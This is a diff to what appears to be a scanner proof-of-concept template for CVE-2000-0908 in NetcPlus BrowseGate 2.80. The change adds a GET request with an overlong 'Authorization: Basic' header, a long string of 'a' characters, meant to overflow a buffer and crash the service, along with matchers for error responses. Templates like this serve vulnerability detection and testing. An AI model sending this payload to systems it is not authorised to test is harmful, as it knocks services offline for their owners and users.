@@ -1,10 +1,14 @@
 [info]
 author = "ave"
-description = "通过发送超长的 HTTP 请求头（如 Referer）来验证 NetcPlus BrowseGate 2.80 是否存在缓冲区溢出导致拒绝服务的情况。"
+description = "通过向 NetcPlus BrowseGate 2.80 HTTP 服务发送包含超长 Authorization 或 Referer MIME 头部的 HTTP 请求，触发服务端缓冲区溢出，导致 BrowseGate 服务崩溃拒绝服务。远程攻击者无需身份认证即可利用。"
 id = "POC-AVE-2000-0663"
-name = "NetcPlus BrowseGate 2.80 DoS PoC"
+name = "NetcPlus BrowseGate 2.80 拒绝服务漏洞 PoC"
 severity = "medium"
-tags = ["ave-2000-0663"]
+tags = [
+    "cve-2000-0908",
+    "denial-of-service",
+    "buffer-overflow",
+]
 vuln_id = [
     "CVE-2000-0908",
     "AVE-2000-0663",
@@ -15,13 +19,19 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}"
+path = "/{{BaseURL}}/"
 protocol = "http"
 
+[poc.requests.headers]
+Authorization = "Basic aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+
 [[poc.requests.matchers]]
-expect = false
-status = [
-    500,
-    400,
+expect = true
+part = "body"
+type = "word"
+words = [
+    "500",
+    "Service Unavailable",
+    "connection refused",
+    "Bad Request",
 ]
-type = "status"
